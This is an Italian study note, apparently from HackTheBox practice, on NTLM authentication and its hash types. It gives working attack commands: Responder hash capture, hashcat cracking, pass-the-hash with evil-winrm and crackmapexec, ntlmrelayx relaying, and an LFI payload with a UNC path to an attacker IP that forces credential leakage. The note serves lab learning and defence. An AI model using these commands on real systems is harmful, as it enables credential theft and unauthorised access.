	# NTLM — NT LAN Manager

**Categoria:** #autenticazione #windows #hashing #exploitation  
**OS:** Windows  
**Relazioni:** [[WinRM]] [[MariaDB]]

vedi LM [[LM-Lan Manager]] per saperne di più sulla parte tecnica
---

## 📖 Cos'è

NTLM è il protocollo di autenticazione legacy di Windows, usato per autenticare utenti su reti Windows. Funziona tramite un meccanismo **challenge-response** — la password non viene mai trasmessa in chiaro.
	
---

## 🔐 Come funziona — Challenge-Response

```
Client                          Server
  |                               |
  |-- 1. NEGOTIATE_MESSAGE -----> |
  |      "voglio autenticarmi"    |
  |                               |
  | <-- 2. CHALLENGE_MESSAGE ---- |
  |      "ecco un valore random   |
  |       (challenge)"            |
  |                               |
  |-- 3. AUTHENTICATE_MESSAGE --> |
  |      Hash(password + challenge)|
  |                               |
  |                    verifica l'hash
  |                               |
  | <-- 4. Accesso concesso ----- |
```

La password non viaggia mai in rete — viaggia solo l'hash calcolato con il challenge.

---

## 🔑 Tipi di hash NTLM

### NTHash (NTLM hash)

```
MD4(UTF-16LE(password))
```

Hashcat mode: `-m 1000`

### Net-NTLMv1

Challenge-response di prima generazione — debole, crackabile facilmente.  
Hashcat mode: `-m 5500`

### Net-NTLMv2

Challenge-response di seconda generazione — più robusto ma ancora crackabile offline.  
Hashcat mode: `-m 5600`

> ⚠️ NTHash e Net-NTLMv2 sono **cose diverse**:
> 
> - **NTHash** → estratto dal SAM/database, usato per Pass-the-Hash
> - **Net-NTLMv2** → catturato durante autenticazione di rete, NON usabile per Pass-the-Hash

---

## 💥 Attacchi

### 1. Capture — Responder

Cattura hash Net-NTLMv2 mettendosi in ascolto sulla rete:

```bash
sudo responder -I tun0
```

Quando una vittima si autentica verso la tua macchina (anche involontariamente tramite LFI con path UNC), catturi l'hash.

### 2. Cracking offline — Hashcat

```bash
# Net-NTLMv2
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# NTHash
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

### 3. Pass-the-Hash (PtH)

Con un NTHash puoi autenticarti **senza conoscere la password in chiaro**:

```bash
evil-winrm -i <IP> -u <utente> -H <NTHash>
crackmapexec smb <IP> -u <utente> -H <NTHash>
```

### 4. Relay Attack

Invece di crackare l'hash, lo ri-utilizzi in tempo reale verso un altro servizio:

```bash
ntlmrelayx.py -t smb://<target>
```

---

## 🔗 LFI + Responder = Capture NTLMv2

Su macchine Windows con LFI è possibile forzare un'autenticazione NTLM verso la propria macchina usando un path UNC:

```
http://target.com/index.php?page=//TUO_IP/share
```

Windows tenta di autenticarsi al tuo "share" → Responder cattura l'hash NTLMv2.

L'hash che cattura Responder non è una password di sistema, è la password dell'**utente Windows** che ha triggerato la connessione SMB.

---

Quando il server Windows tenta di connettersi a `\\TUO_IP\share`, lo fa nel contesto di un utente specifico — ad esempio:

```
Il processo PHP gira come utente "Administrator"
       ↓
Windows tenta connessione SMB
       ↓
Manda l'hash NTLM di "Administrator"
       ↓
Responder lo cattura
```

Quindi l'hash che ottieni è la password di quell'utente Windows — che potrebbe essere:

- `Administrator`
- Un utente di servizio
- L'utente che sta eseguendo il web server

---

E questo è prezioso perché:

```
Hash catturato
       ↓
Cracking con hashcat → password in chiaro
       ↓
Quella stessa password funziona su Evil-WinRM
       ↓
Shell sulla macchina 🎯
```

Su HTB le macchine sono configurate apposta con password crackabili con rockyou.txt. Nel mondo reale non è sempre così semplice, ma il principio è identico — se l'utente ha una password debole, sei dentro. 🙂


---

## 📊 NTLM vs Kerberos

| |NTLM|Kerberos|
|---|---|---|
|Tipo|Challenge-Response|Ticket-based|
|Sicurezza|Debole|Più robusto|
|Uso|Workgroup, legacy|Active Directory|
|Attacchi|Capture, PtH, Relay|Pass-the-Ticket, Kerberoasting|
guarda pure [[LM-Lan Manager]] il predecessore di NTLM e perché fa troppo cagare. 

---

## 📚 Lezioni apprese

- NTLM è legacy ma ancora moltissimo usato in ambienti Windows reali
- Net-NTLMv2 si cattura con Responder — non si può usare per PtH ma si può crackare
- NTHash si estrae dal SAM — si può usare per PtH
- LFI su Windows + Responder = combo potente per ottenere hash senza toccare il sistema
- Una volta crackato l'hash → credenziali valide per Evil-WinRM

---

## 🔗 Riferimenti

- [[WinRM]] — accesso con credenziali NTLM
- [HackTricks - NTLM](https://book.hacktricks.xyz/windows-hardening/ntlm)
- [Responder GitHub](https://github.com/lgandx/Responder)

---

## Tags

#ntlm #windows #autenticazione #hash #responder #pass-the-hash #net-ntlmv2 #evil-winrm #cracking